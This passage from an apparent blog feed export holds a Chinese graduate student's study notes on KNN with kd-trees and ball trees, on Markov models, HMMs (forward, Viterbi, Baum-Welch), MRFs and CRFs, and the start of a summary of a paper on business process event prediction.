color="#8A2BE2">样本点由于所在的超矩形体和超球体不相交，根本不需要计算距离。大大节省了计算时间。</font></p><p>先进行二叉查找，先从（7,2）查找到（5,4）节点，在进行查找时是由y = 4为分割超平面的，由于查找点为y值为4.5，因此进入右子空间查找到（4,7），形成搜索路径&lt;(7,2)，(5,4)，(4,7)&gt;，但 （4,7）与目标查找点的距离为3.202，而（5,4）与查找点之间的距离为3.041，所以（5,4）为查询点的最近点； 以（2，4.5）为圆心，以3.041为半径作圆，如下图所示。可见该圆和y = 4超平面交割，所以需要进入（5,4）左子空间进行查找，也就是将（2,3）节点加入搜索路径中得&lt;(7,2)，(2,3)&gt;；于是接着搜索至（2,3）叶子节点，（2,3）距离（2,4.5）比（5,4）要近，所以最近邻点更新为（2，3），最近距离更新为1.5；回溯查找至（5,4），直到最后回溯到根结点（7,2）的时候，以（2,4.5）为圆心1.5为半径作圆，并不和x = 7分割超平面交割，如下图所示。至此，搜索路径回溯完，返回最近邻点（2,3），最近距离1.5。</p><h3 id="球树实现原理"><a href="#球树实现原理" class="headerlink" title="球树实现原理"></a>球树实现原理</h3><p>KD树算法虽然提高了KNN搜索的效率，但是在某些时候效率并不高，比如当处理不均匀分布的数据集时,不管是近似方形，还是矩形，甚至正方形，都不是最好的使用形状，因为他们都有角。一个例子如下图：<br><img src="http://files.shanqianche.cn/202175/1625496491462.png" alt="enter description here"></p><p>　　如果黑色的实例点离目标点星点再远一点，那么虚线圆会如红线所示那样扩大，导致与左上方矩形的右下角相交，既然相 交了，那么就要检查这个左上方矩形，而实际上，最近的点离星点的距离很近，检查左上方矩形区域已是多余。于此我们看见，KD树把二维平面划分成一个一个矩形，但矩形区域的角却是个难以处理的问题。</p><p>　　为了优化超矩形体导致的搜索效率的问题，有人引入了球树，这种结构可以优化上面的这种问题。</p><p><strong><font color="#7FFF00">球树的建立</font></strong></p><p><img src="http://files.shanqianche.cn/202175/1625496601030.png" alt="球树"></p><ol><li>先构建一个超球体，这个超球体是可以包含所有样本的最小球体。</li><li>从球中选择一个离球的中心最远的点，然后选择第二个点离第一个点最远，将球中所有的点分配到离这两个聚类中心最近的一个上，然后计算每个聚类的中心，以及聚类能够包含它所有数据点所需的最小半径。这样我们得到了两个子超球体，和KD树里面的左右子树对应。（PS:<font color="#B22222">这里选择两个点后，就以这两个点来聚类，所以先确定的是以这两个点为中心来计算其他点到该中心的距离。当所有点都确定自己的中心后，再重新计算一次该超球体的半径和球心</font>。）</li><li>对于这两个子超球体，递归执行步骤2，最终得到了一个球树。</li></ol><p>　　可以看出KD树和球树类似，主要区别在于球树得到的是节点样本组成的最小超球体，而KD得到的是节点样本组成的超矩形体，这个超球体要与对应的KD树的超矩形体小，这样在做最近邻搜索的时候，可以避免一些无谓的搜索。</p><h2 id="KNN优缺点"><a href="#KNN优缺点" class="headerlink" title="KNN优缺点"></a>KNN优缺点</h2><p>优点：</p><ol><li>结构简单；</li><li>无数据输入假定，准确度高，对异常点不敏感。</li><li> 训练时间复杂度比支持向量机之类的算法低，仅为O(n)</li><li> 由于KNN方法主要靠周围有限的邻近的样本，而不是靠判别类域的方法来确定所属类别的，因此对于类域的交叉或重叠较多的待分样本集来说，KNN方法较其他方法更为适合</li></ol><p>缺点：</p><ol><li>计算复杂度高、空间复杂度高；</li><li>样本不平衡时，对稀有类别预测准确度低；</li><li>使用懒惰学习，预测速度慢。</li><li>KD树，球树之类的模型建立需要大量的内存</li><li>相比决策树模型，KNN模型可解释性不强<h2 id="什么情况下选择KNN"><a href="#什么情况下选择KNN" class="headerlink" title="什么情况下选择KNN"></a>什么情况下选择KNN</h2></li></ol><p><img src="http://files.shanqianche.cn/202177/1625667539256.png" alt="choose"></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="https://www.cnblogs.com/ybjourney/p/4702562.html">机器学习（一）——K-近邻（KNN）算法 - Yabea - 博客园</a></p><h2 id="序列KNN"><a href="#序列KNN" class="headerlink" title="序列KNN"></a>序列KNN</h2><p><a href="https://antkillerfarm.github.io/ml/2017/10/19/Machine_Learning_28.html">机器学习（二十八）——KNN, AutoML, 数据不平衡问题</a></p><p><a href="https://blog.csdn.net/qq_41196612/article/details/107265167">R语言实战——基于KNN聚类的时间序列分析预测_三只佩奇不结义的博客-CSDN博客_r语言knn回归及预测</a></p><p><a href="https://www.coder.work/article/383913">python - 如何使用 KNN/K-means 对数据帧中的时间序列进行聚类 - IT工具网</a></p><p><a href="https://github.com/iwuqing/Time-Series-Classification-based-on-KNN">iwuqing/Time-Series-Classification-based-on-KNN: 基于KNN聚类算法结合Dynamic Time Warping（动态时间调整）的时间序列分类</a></p><p><a href="https://github.com/vvanggeng/TSC-KNN">vvanggeng/TSC-KNN: 基于KNN和DTW的时间序列分类</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
            <tag> paper </tag>
            
            <tag> machine leaning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markov Model（马尔可夫模型）</title>
      <link href="/2021/07/05/Markov%20Model%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B%EF%BC%89/"/>
      <url>/2021/07/05/Markov%20Model%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/mantch/p/11203748.html">一次性弄懂马尔可夫模型、隐马尔可夫模型、马尔可夫网络和条件随机场！(词性标注代码实现) - mantch - 博客园</a></p><h2 id="马尔可夫网络、马尔可夫模型、马尔可夫过程、贝叶斯网络的区别"><a href="#马尔可夫网络、马尔可夫模型、马尔可夫过程、贝叶斯网络的区别" class="headerlink" title="马尔可夫网络、马尔可夫模型、马尔可夫过程、贝叶斯网络的区别"></a>马尔可夫网络、马尔可夫模型、马尔可夫过程、贝叶斯网络的区别</h2><p>共分六点说明这些概念【<font color="#DC143C">这6点是依次递进的，不要跳跃着看</font>】：</p><ol><li>将随机变量作为结点，若两个随机变量相关或者不独立，则将二者连接一条边；若给定若干随机变量，则形成一个有向图，即构成一个<strong>网络</strong>。</li><li>如果该网络是有向无环图，则这个网络称为<strong>贝叶斯网络</strong>。</li><li>如果这个图退化成线性链的方式，则得到<strong>马尔可夫模型</strong>；因为每个结点都是随机变量，将其看成各个时刻(或空间)的相关变化，以随机过程的视角，则可以看成是<strong>马尔可夫过程</strong>。</li><li>若上述网络是无向的，则是无向图模型，又称<strong>马尔可夫随机场</strong>或者<strong>马尔可夫网络</strong>。</li><li>如果在给定某些条件的前提下，研究这个马尔可夫随机场，则得到<strong>条件随机场</strong>。</li><li>如果使用条件随机场解决标注问题，并且进一步将条件随机场中的网络拓扑变成线性的，则得到<strong>线性链条件随机场</strong>。</li></ol><h2 id="马尔可夫模型"><a href="#马尔可夫模型" class="headerlink" title="马尔可夫模型"></a>马尔可夫模型</h2><h3 id="马尔可夫过程"><a href="#马尔可夫过程" class="headerlink" title="马尔可夫过程"></a>马尔可夫过程</h3><p>马尔可夫过程（Markov process）是一类<font color="#00FFFF">随机</font>过程。它的原始模型是马尔可夫链。<br>该过程具有如下特性：在已知目前状态（现在）的条件下，它未来的演变（将来）<font color="#0000FF">不依赖</font>于它以往的演变 (过去 )。</p><p>每个状态的转移只依赖于之前的n个状态，这个过程被称为1个n阶的模型，其中n是影响转移状态的数目。最简单的马尔可夫过程就是一阶过程，<font color="#006400">每一个状态的转移只依赖于其之前的那一个状态</font>，这个也叫作<strong>马尔可夫性质</strong>。</p><p>假设这个模型的每个状态都只依赖于之前的状态，这个假设被称为<font color="#1E90FF">马尔科夫假设</font>，这个假设可以大大的简化这个问题。显然，这个假设可能是一个非常糟糕的假设，导致很多重要的信息都丢失了。<br><img src="http://files.shanqianche.cn/202176/1625557564343.png"></p><p>假设天气服从<strong>马尔可夫链</strong>：</p><p><img src="http://files.shanqianche.cn/202176/1625557700847.png" alt="天气"></p><p>从上面这幅图可以看出：</p><ul><li>假如今天是晴天，明天变成阴天的概率是0.1</li><li>假如今天是晴天，明天任然是晴天的概率是0.9，和上一条概率之和为1，这也符合真实生活的情况。</li></ul><p><img src="http://files.shanqianche.cn/202178/1625728052403.png" alt="表格"></p><p>由上表我们可以得到马尔可夫链的<strong>状态转移矩阵</strong>：<br><img src="http://files.shanqianche.cn/202176/1625557951076.png" alt="状态转移矩阵"></p><p>因此，一阶马尔可夫过程定义了以下三个部分：</p><ul><li>状态：晴天和阴天</li><li>初始向量：定义系统在时间为0的时候的状态的概率</li><li>状态转移矩阵：每种天气转换的概率</li></ul><p>马尔可夫模型（Markov Model）是一种<font color="#DC143C">统计模型</font>，广泛应用在语音识别，词性自动标注，音字转换，概率文法等各个自然语言处理等应用领域。经过长期发展，尤其是在语音识别中的成功应用，使它成为一种通用的统计工具。到目前为止，它一直被认为是实现快速精确的语音识别系统的最成功的方法。</p><h2 id="隐马尔可夫模型（HMM）"><a href="#隐马尔可夫模型（HMM）" class="headerlink" title="隐马尔可夫模型（HMM）"></a>隐马尔可夫模型（HMM）</h2><blockquote><p> 在某些情况下马尔科夫过程不足以描述我们希望发现的模式。回到之前那个天气的例子，一个隐居的人可能不能直观的观察到天气的情况，但是有一些海藻。民间的传说告诉我们海藻的状态在某种概率上是和天气的情况相关的。在这种情况下我们有两个状态集合，一个可以观察到的状态集合（海藻的状态）和一个隐藏的状态（天气的状况）。我们希望能找到一个算法可以根据海藻的状况和马尔科夫假设来预测天气的状况。</p></blockquote><p>而这个算法就叫做**隐马尔可夫模型(HMM)**。</p><p><img src="http://files.shanqianche.cn/202176/1625559690747.png" alt="HMM"></p><p>隐马尔可夫模型 (Hidden Markov Model) 是一种<strong>统计模型</strong>，用来描述一个含有隐含未知参数的马尔可夫过程。<strong>它是结构最简单的动态贝叶斯网，这是一种著名的有向图模型，</strong> 主要用于<font color="#FF00FF">时序</font>数据建模，在语音识别、自然语言处理等领域有广泛应用。</p><h3 id="隐马尔可夫三大问题"><a href="#隐马尔可夫三大问题" class="headerlink" title="隐马尔可夫三大问题"></a>隐马尔可夫三大问题</h3><p><font color="#9400D3">注意</font></p><ol><li>给定模型，如何有效计算产生观测序列的概率？换言之，如何评估模型与观测序列之间的<font color="#FF1493">匹配程度</font>？</li><li>给定模型和观测序列，如何找到与此观测序列最匹配的状态序列？换言之，如何根据观测序列推断出隐藏的<font color="#B22222">模型状态</font>？</li><li>给定观测序列，如何调整模型参数使得该序列出现的概率最大？换言之，如何训练模型使其能最好地<font color="#B22222">描述</font>观测数据？</li></ol><p>前两个问题是模式识别的问题：1) 根据隐马尔科夫模型得到一个可观察状态序列的概率(<strong>评价</strong>)；2) 找到一个隐藏状态的序列使得这个序列产生一个可观察状态序列的概率最大(<strong>解码</strong>)。第三个问题就是根据一个可以观察到的状态序列集产生一个隐马尔科夫模型（<strong>学习</strong>）。</p><p>对应的三大问题解法：</p><ol><li>向前算法(Forward Algorithm)、向后算法(Backward Algorithm)</li><li>维特比算法(Viterbi Algorithm)</li><li>鲍姆-韦尔奇算法(Baum-Welch Algorithm) (约等于EM算法)</li></ol><blockquote><p>小明现在有三天的假期，他为了打发时间，可以在每一天中选择三件事情来做，这三件事情分别是散步、购物、打扫卫生(<strong>对应着可观测序列</strong>)，可是在生活中我们所做的决定一般都受到天气的影响，可能晴天的时候想要去购物或者散步，可能下雨天的时候不想出门，留在家里打扫卫生。而天气(晴天、下雨天)就属于<strong>隐藏状态</strong>，用一幅概率图来表示这一马尔可夫过程：</p></blockquote><p><img src="http://files.shanqianche.cn/202176/1625563725550.png" alt="场景"></p><p>那么，我们提出三个问题，分别对应马尔可夫的<font color="#B22222">三大</font>问题：</p><ol><li>已知整个模型，我观测到连续三天做的事情是：散步，购物，收拾。那么，根据模型，计算产生这些行为的概率是多少。</li><li>同样知晓这个模型，同样是这三件事，我想猜，这三天的天气是怎么样的。</li><li>最复杂的，我只知道这三天做了这三件事儿，而其他什么信息都没有。我得建立一个模型，晴雨转换概率，第一天天气情况的概率分布，根据天气情况选择做某事的概率分布。</li></ol><h3 id="第一个问题解法"><a href="#第一个问题解法" class="headerlink" title="第一个问题解法"></a>第一个问题解法</h3><ol><li><strong>遍历算法</strong></li></ol><p>假设第一天(T=1 时刻)是晴天，想要购物，那么就把图上的对应概率相乘就能够得到了。<br>第二天(T=2 时刻)要做的事情，在第一天的概率基础上乘上第二天的概率，依次类推，最终得到这三天(T=3 时刻)所要做的事情的概率值，这就是遍历算法，简单而又粗暴。但问题是<font color="#2F4F4F">用遍历算法的复杂度会随着观测序列和隐藏状态的增加而成指数级增长。</font></p><p><font color="#B22222">复杂度为</font>：<math xmlns="http://www.w3.org/1998/Math/MathML"><mn>2</mn><mi>T</mi><msup><mi>N</mi><mi>T</mi></msup></math></p><p><font color="#8A2BE2">理解：</font>每次计算行为发生概率都从最开始遍历计算</p><ol start="2"><li><p><strong>前向算法</strong></p><ol><li>假设第一天要购物，那么就计算出第一天购物的概率(包括晴天和雨天)；假设第一天要散步，那么也计算出来，依次枚举。</li><li>假设前两天是购物和散步，也同样计算出这一种的概率；假设前两天是散步和打扫卫生，同样计算，枚举出前两天行为的概率。</li><li>第三步就是计算出前三天行为的概率。</li></ol></li></ol><p>第二步中要求的概率可以在第一步的基础上进行，同样的，第三步也会<font color="#0000FF">依赖</font>于第二步的计算结果。那么这样做就能够<strong>节省很多计算环节，类似于动态规划</strong>。</p><p><font color="#B22222">复杂度为</font>：<math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>N</mi><mn>2</mn></msup><mi>T</mi></math></p><ol start="3"><li>后向算法</li></ol><p>跟前向算法相反，我们知道总的概率肯定是1，那么B_t=1，也就是最后一个时刻的概率合为1，先计算前三天的各种可能的概率，在计算前两天、前一天的数据，<font color="#696969">跟前向算法相反</font>的计算路径。</p><h3 id="第二个问题解法"><a href="#第二个问题解法" class="headerlink" title="第二个问题解法"></a>第二个问题解法</h3><ol><li>维特比算法（Viterbi）</li></ol><blockquote><p>维特比算法是一个特殊但应用最广的<strong>动态规划算法</strong>。利用动态规划，可以解决任何一个图中的<strong>最短</strong>路径问题。而维特比算法是针对一个特殊的图—篱笆网络（Lattice）的有向图最短路径问题而提出的。它之所以重要，是因为凡是使用<font color="#057748">隐含马尔可夫模型</font>描述的问题都可以用它来解码，包括今天的数字通信、语音识别、机器翻译、拼音转汉字、分词等。</p></blockquote><p>维特比算法一般用于模式识别，通过观测数据来<font color="#FF1493">反推出隐藏状态</font>。</p><p>因为是要根据观测数据来反推，所以这里要进行一个假设，<strong>假设这三天所做的行为分别是：散步、购物、打扫卫生</strong>，那么我们要求的是这三天的天气(路径)分别是什么。</p><ol><li>初始计算第一天下雨和第一天晴天去散步的概率值：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>1</mn></msub><mo>(</mo><mi>R</mi><mo>)</mo></math>表示第一天下雨的概率<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x3C0;</mi><mi>R</mi></msub></math>表示中间的状态(下雨)概率<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>b</mi><mi>R</mi></msub><mo>(</mo><msub><mi>O</mi><mn>1</mn></msub><mo>=</mo><mi>w</mi><mo>)</mo></math>表示下雨并且散步的概率<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>a</mi><mrow><mi>R</mi><mo>-</mo><mi>R</mi></mrow></msub></math>表示下雨天到下雨天的概率</li></ol><p><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>1</mn></msub><mo>(</mo><mi>R</mi><mo>)</mo></math>=<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x3C0;</mi><mi>R</mi></msub><mo>*</mo><msub><mi>b</mi><mi>R</mi></msub><mo>(</mo><msub><mi>O</mi><mn>1</mn></msub><mo>=</mo><mi>w</mi><mo>)</mo></math>=0.6 * 0.1 = 0.06</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>1</mn></msub><mo>(</mo><mi>S</mi><mo>)</mo></math>=<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x3C0;</mi><mi>S</mi></msub><mo>*</mo><msub><mi>b</mi><mi>S</mi></msub><mo>(</mo><msub><mi>O</mi><mn>1</mn></msub><mo>=</mo><mi>w</mi><mo>)</mo></math>=0.4 * 0.6 = 0.24</p><p><font color="#006400">初始路径</font>为：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x3D5;</mi><mn>1</mn></msub><mo>(</mo><mi>R</mi><mo>)</mo></math>=Rainy<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x3D5;</mi><mn>1</mn></msub><mo>(</mo><mi>S</mi><mo>)</mo></math>=Sunny</p><ol start="2"><li>计算第二天下雨和第二天晴天去购物的概率值:</li></ol><p><img src="http://files.shanqianche.cn/202177/1625641072263.png" alt="行为概率"></p><p><font color="#00FFFF">对应路径为：</font></p><p><img src="http://files.shanqianche.cn/202177/1625642052293.png" alt="对应路径"></p><ol start="3"><li>计算第三天下雨和第三天晴天去打扫卫生的概率值：</li></ol><p><img src="http://files.shanqianche.cn/202177/1625642832307.png" alt="第三天概率"></p><p><font color="#228B22">对应路径为：</font></p><p><img src="http://files.shanqianche.cn/202177/1625642928241.png" alt="行为路径"></p><ol start="4"><li><p>比较每一步中△的概率大小，选取最大值并找到对应的路径，依次类推就能找到最有可能的隐藏状态路径。</p><ol><li>第一天的概率最大值为 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>1</mn></msub><mi>S</mi></math>，对应路径为Sunny，</li><li>第二天的概率最大值为 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>2</mn></msub><mi>S</mi></math>，对应路径为Sunny，</li><li>第三天的概率最大值为 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>△</mi><mn>3</mn></msub><mi>S</mi></math>，对应路径为Rainy。</li></ol></li><li><p>合起来的路径就是Sunny-&gt;Sunny-&gt;Rainy，这就是我们所求。</p></li></ol><h3 id="第三个问题解法"><a href="#第三个问题解法" class="headerlink" title="第三个问题解法"></a>第三个问题解法</h3><p>鲍姆-韦尔奇算法(Baum-Welch Algorithm) (约等于<strong>EM</strong>算法)</p><p>如果训练数据只有观测序列而没有状态序列，即{<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>O</mi><mn>1</mn></msub><mo>,</mo><msub><mi>O</mi><mn>2</mn></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>O</mi><mi>S</mi></msub></math>}此时HMM的学习就得使用EM算法了，这是<font color="#FF1493">非监督</font>学习。</p><p>通常，如果给定数据和已经模型，那么求模型参数我们会用<font color="#8A2BE2">极大似然估计法</font>，但是<font color="#8B008B">如果变量中含有隐变量，无法用极大似然求解</font>（对数式子里面有求和，难以求出解析解），此时就可以使用EM算法。考虑HMM，观测序列 O是显变量，而状态变量I  则是隐变量，所以HMM实际上是<font color="#556B2F">含有隐变量的概率模型</font></p><p><img src="http://files.shanqianche.cn/202177/1625646003916.png" alt="HMM的概率模型 | λ为模型参数"></p><blockquote><p><font color="#00FFFF">知识补充</font><br>极大似然估计<br>利用已知的样本结果信息，反推最具有可能（最大概率）导致这些样本结果出现的模型参数值！<br>换句话说，极大似然估计提供了一种给定观察数据来评估模型参数的方法，即：“<font color="#FF8C00">模型已定，参数未知</font>”。</p></blockquote><p>可以使用EM算法来求得模型参数。</p><p>关于EM算法流程，有多个版本，但是仔细学习可以发现是大同小异的，以下使用《统计学习方法》上介绍的EM算法流程。</p><p><a href="https://blog.csdn.net/qq_37334135/article/details/86302735">HMM学习笔记（二）：监督学习方法与Baum-Welch算法_成都往右的博客-CSDN博客</a></p><h2 id="马尔可夫网络"><a href="#马尔可夫网络" class="headerlink" title="马尔可夫网络"></a>马尔可夫网络</h2><h3 id="因子图"><a href="#因子图" class="headerlink" title="因子图"></a>因子图</h3><p>WiKIpedia：将一个具有多变量的全局函数因子分解，得到几个局部函数的乘积，以此为基础得到的一个双向图叫做<font color="#00CED1">因子图</font>（Factor Graph）。</p><p>通俗来讲，所谓因子图就是对函数进行因子分解得到的一种<strong>概率图</strong>。一般内含两种节点：变量节点和函数节点。我们知道，一<font color="#FF1493">个全局函数通过因式分解能够分解为多个局部函数的乘积</font>，这些局部函数和对应的变量关系就体现在因子图上。</p><p><img src="http://files.shanqianche.cn/202177/1625649785149.png" alt="栗子"></p><p>其中fA,fB,fC,fD,fE为各函数，表示变量之间的关系，可以是条件概率也可以是其他关系。其对应的因子图为：</p><p><img src="http://files.shanqianche.cn/202177/1625659847778.png" alt="变量-函数之间因子图"></p><p><img src="http://files.shanqianche.cn/202177/1625659895044.png" alt="变量-函数之间因子图"></p><h3 id="马尔可夫网络-1"><a href="#马尔可夫网络-1" class="headerlink" title="马尔可夫网络"></a>马尔可夫网络</h3><blockquote><p>我们已经知道，<strong>有向</strong>图模型，又称作<font color="#bf242a">贝叶斯网络</font>，但在有些情况下，强制对某些结点之间的边增加方向是不合适的。<strong>使用没有方向的无向边，形成了无向图模型</strong>（Undirected Graphical Model,UGM）, 又被称为<strong>马尔可夫随机场或者马尔可夫网络</strong>（Markov Random Field, MRF or Markov network）。</p></blockquote><p><img src="http://files.shanqianche.cn/202177/1625660204643.png" alt="MRF"></p><p>设X=(X1,X2…Xn)和Y=(Y1,Y2…Ym)都是<font color="#006400">联合随机变量</font>，若随机变量Y构成一个无向图 G=(V,E)表示的马尔可夫随机场（MRF），则条件概率分布P(Y|X)称为<strong>条件随机场</strong>（Conditional Random Field, 简称CRF，后续新的博客中可能会阐述CRF）。如下图所示，便是一个线性链条件随机场的无向图模型：</p><p><img src="http://files.shanqianche.cn/202177/1625664493380.png" alt="CRF"></p><p>在概率图中，求某个变量的边缘分布是常见的问题。这问题有很多求解方法，其中之一就是<font color="#A52A2A">把贝叶斯网络或马尔可夫随机场转换成因子图，然后用sum-product算法求解</font>。换言之，基于因子图可以用<strong>sum-product 算法</strong>高效的求各个变量的边缘分布。</p><p>详细的sum-product算法过程，请查看博文：<a href="https://blog.csdn.net/v_july_v/article/details/40984699">从贝叶斯方法谈到贝叶斯网络_结构之法 算法之道-CSDN博客_贝叶斯</a></p><h2 id="条件随机场-CRF"><a href="#条件随机场-CRF" class="headerlink" title="条件随机场(CRF)"></a>条件随机场(CRF)</h2><p><strong>一个通俗的例子</strong></p><p>假设你有许多小明同学一天内不同时段的照片，从小明提裤子起床到脱裤子睡觉各个时间段都有（小明是照片控！）。现在的任务是对这些照片进行分类。比如有的照片是吃饭，那就给它打上吃饭的标签；有的照片是跑步时拍的，那就打上跑步的标签；有的照片是开会时拍的，那就打上开会的标签。问题来了，你准备怎么干？</p><p>一个简单直观的办法就是，不管这些照片之间的时间顺序，想办法训练出一个多元分类器。就是用一些打好标签的照片作为训练数据，训练出一个模型，直接根据照片的特征来分类。例如，如果照片是早上6:00拍的，且画面是黑暗的，那就给它打上睡觉的标签;如果照片上有车，那就给它打上开车的标签。</p><p>乍一看可以！但实际上，由于我们忽略了这些照片之间的时间顺序这一重要信息，我们的分类器会有缺陷的。举个例子，假如有一张小明闭着嘴的照片，怎么分类？显然难以直接判断，需要参考闭嘴之前的照片，如果之前的照片显示小明在吃饭，那这个闭嘴的照片很可能是小明在咀嚼食物准备下咽，可以给它打上吃饭的标签；如果之前的照片显示小明在唱歌，那这个闭嘴的照片很可能是小明唱歌瞬间的抓拍，可以给它打上唱歌的标签。</p><p>所以，为了让我们的分类器能够有更好的表现，<strong>在为一张照片分类时，我们必须将与它相邻的照片的标签信息考虑进来</strong>。这——就是条件随机场(CRF)大显身手的地方！这就有点类似于词性标注了，只不过把照片换成了句子而已，本质上是一样的。</p><p>如同马尔可夫随机场，条件随机场为具有<strong>无向</strong>的图模型，图中的顶点代表随机变量，顶点间的连线代表随机变量间的相依关系，在条件随机场中，随机变量Y 的分布为条件机率，给定的观察值则为随机变量 X。下图就是一个线性连条件随机场。</p><p><img src="http://files.shanqianche.cn/202177/1625665022911.png" alt="线性连条件随机场"></p><p>条件概率分布P(Y|X)称为条件随机场。</p><h2 id="EM算法、HMM、CRF的比较"><a href="#EM算法、HMM、CRF的比较" class="headerlink" title="EM算法、HMM、CRF的比较"></a>EM算法、HMM、CRF的比较</h2><ol><li><strong>EM算法</strong>是<font color="#8FBC8F">用于含有隐变量模型</font>的极大似然估计或者极大后验估计，有两步组成：E步，求期望（expectation）；M步，求极大（maxmization）。本质上EM算法还是一个迭代算法，通过不断用上一代参数对隐变量的估计来对当前变量进行计算，直到收敛。注意：EM算法是对初值敏感的，而且EM是不断求解下界的极大化逼近求解对数似然函数的极大化的算法，也就是说<font color="#B22222">EM算法不能保证找到全局最优值</font>。对于EM的导出方法也应该掌握。</li><li><strong>隐马尔可夫模型</strong>是<font color="#8FBC8F">用于标注问题的生成模型</font>。有几个参数（π，A，B）：初始状态概率向量π，状态转移矩阵A，观测概率矩阵B。称为马尔科夫模型的三要素。马尔科夫三个基本问题：<br>  <strong>概率计算问题</strong>：给定模型和观测序列，计算模型下观测序列输出的概率。–》前向后向算法<br> <strong>学习问题</strong>：已知观测序列，估计模型参数，即用极大似然估计来估计参数。–》Baum-Welch(也就是EM算法)和极大似然估计。<br> <strong>预测问题</strong>：已知模型和观测序列，求解对应的状态序列。–》近似算法（贪心算法）和维比特算法（动态规划求最优路径）</li><li><strong>条件随机场CRF</strong>，给定一组输入随机变量的条件下另一组输出随机变量的条件概率分布密度。条件随机场假设输出变量构成马尔科夫随机场，而我们平时看到的大多是线性链条随机场，也就是由输入对输出进行预测的判别模型。求解方法为<font color="#B22222">极大似然估计或正则化的极大似然估计。</font></li><li>之所以总把HMM和CRF进行比较，主要是因为CRF和HMM都利用了图的知识，但是CRF利用的是马尔可夫随机场（无向图），而HMM的基础是贝叶斯网络（有向图）。而且CRF也有概率计算问题、学习问题和预测问题。大致计算方法和HMM类似，只不过不需要EM算法进行学习问题。</li><li>HMM和CRF对比：其根本还是在于基本的理念不同，一个是生成模型，一个是判别模型，这也就导致了求解方式的不同。</li></ol>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
            <tag> paper </tag>
            
            <tag> machine leaning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用于业务流程事件和结果预测的混合模型</title>
      <link href="/2021/07/05/%E7%94%A8%E4%BA%8E%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E4%BA%8B%E4%BB%B6%E5%92%8C%E7%BB%93%E6%9E%9C%E9%A2%84%E6%B5%8B%E7%9A%84%E6%B7%B7%E5%90%88%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/07/05/%E7%94%A8%E4%BA%8E%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E4%BA%8B%E4%BB%B6%E5%92%8C%E7%BB%93%E6%9E%9C%E9%A2%84%E6%B5%8B%E7%9A%84%E6%B7%B7%E5%90%88%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>对于多样性流程进行异常预测</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><ol><li>序列k近邻法（KNN）</li><li>基于序列比对的马尔科夫模型扩展法</li></ol><p><font color="#1E90FF">思路：</font><br>利用数据的时间分类特征，利用高阶马尔可夫模型预测过程的下一步，并利用序列对比技术预测过程的结果。通过考虑基于k个最近邻的相似过程序列的子集，增加了数据的多样性方面。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>已经证明，通过一组实验，序列k最近邻提法比原始提供更好的结果;我们的扩展马尔可夫模型优于随机猜测、马尔可夫模型和隐马尔可夫模型。</p><blockquote><p><font color="#2e4e7e">知识补充</font><br><a href="https://blog.zuishuailcq.xyz/2021/07/05/KNN%EF%BC%88K%E8%BF%91%E9%82%BB%E6%B3%95%20K%20Nearest%20Neighbors%EF%BC%89/">KNN（K近邻法 K Nearest Neighbors） | 吾辈之人，自当自强不息！</a><br><a href="https://blog.zuishuailcq.xyz/2021/07/05/Markov%20Model%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B%EF%BC%89/">Markov Model（马尔可夫模型） | 吾辈之人，自当自强不息！</a></p></blockquote><h2 id="阐述"><a href="#阐述" class="headerlink" title="阐述"></a>阐述</h2><p>在进行流程预测的前，我们需要从日志中挖掘流程。通过分析数据，可以得知数据为带有<strong>时间序列</strong>的数据。1999年已经有人证明MMs适用于研究用户网上浏览行为。同时事件序列也可用于训练已经<strong>编码后续事件之间的转换概率</strong>的马尔可夫模型，<br>类似其它机器学习模型，越是高阶的模型越是拟合数据，预测结果也更加准确。</p><blockquote><p><font color="#FF1493">知识补充</font><br>在马尔可夫链的每一步，系统根据概率分布，可以从一个状态变到另一个状态,也可以保持当前状态。状态的改变叫做过渡，与不同的状态改变相关的概率叫做<strong>过渡概率</strong><br><font color="#006400">TODO 